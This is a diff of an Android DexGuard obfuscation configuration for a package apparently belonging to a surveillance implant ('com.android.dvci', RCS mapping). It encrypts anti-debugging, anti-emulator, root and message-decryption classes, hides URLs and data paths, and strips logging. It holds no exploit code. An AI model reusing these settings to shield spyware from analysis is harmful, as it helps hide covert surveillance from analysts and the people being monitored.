@@ -3,19 +3,20 @@
 -encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.MessagesDecrypt,
 		com.android.dvci.Root,com.android.dvci.Core,
 		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator
-		
-#-encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.Root
 
-#-encryptclasses com.android.dvci.*
 -encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
 -encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"
 
 -encryptclasses com.android.m.*
 -encryptstrings "KY*"
-#-encryptstrings "KEN_*" 
+-encryptstrings "android.intent.*","android.net.*","vnd.android.*"
 
 -accessthroughreflection class android.content.pm.ApplicationInfo {
     int flags;
+}
+
+-accessthroughreflection class android.content.pm.PackageManager {
+    String getInstallerPackageName(String);
 }
 
 -encryptstrings "android.content.pm.ApplicationInfo", "flags"
@@ -36,9 +37,11 @@
 -optimizations !method/marking/final
 -optimizations !method/inlining/*
 
--classobfuscationdictionary "compact.txt"
+-classobfuscationdictionary "keywords.txt"
 -packageobfuscationdictionary "keywords.txt"
 -obfuscationdictionary "keywords.txt"
+-useuniqueclassmembernames
+-applymapping "rcs_mapping.txt"
 
 #togliere l'offuscamento di com.android.dvci.Core.isServiceRunning
 -keepclassmembers class com.android.dvci.Core {
@@ -54,17 +57,16 @@
     res/layout/main.xml,
     res/values/*
 
--keep class android.media.AmrInputStream
+-keep public class android.media.AmrInputStream
 -keep public class com.android.dvci.BM
 -keep public class com.android.dvci.listener.AR
 -keep public class com.android.dvci.optimize.NetworkOptimizer
--keep public class com.android.dvci.util.Instrument
 
--keep class com.musicg.** { *; }
+#-keep class com.musicg.** { *; }
 -keep class android.media.** {*;}
--keep class com.sun.media.sound.** { *; }
-#-keep !com.android.dvci.** {*;}
+#-keep class com.sun.media.sound.** { *; }
 
+-assumenosideeffects class com.android.dvci.ASG { *; }
 
 -assumenosideeffects class android.util.Log {
     public static boolean isLoggable(java.lang.String, int);
@@ -74,3 +76,14 @@
     public static int d(...);
     public static int e(...);
 }
+
+-assumenosideeffects class com.android.dvci.util.Check {
+    public static void asserts(...);
+    public static void requires(...);
+    public static void ensures(...);
+    public static void log(...);
+    public static void testDexguard(...);
+}
+
+-include dexguard-common.pro
+-include dexguard-assumptions.pro
